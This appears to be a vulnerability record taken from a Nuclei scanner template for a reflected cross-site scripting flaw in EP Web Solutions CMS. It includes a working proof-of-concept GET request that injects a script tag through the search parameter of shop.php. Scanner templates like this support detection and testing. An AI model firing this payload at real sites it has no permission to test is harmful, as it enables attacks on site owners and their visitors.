# Vulnerability: EP Web Solutions CMS - Cross Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`ep-web-cms-xss.yaml`)

## Description
Cross-site scripting is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

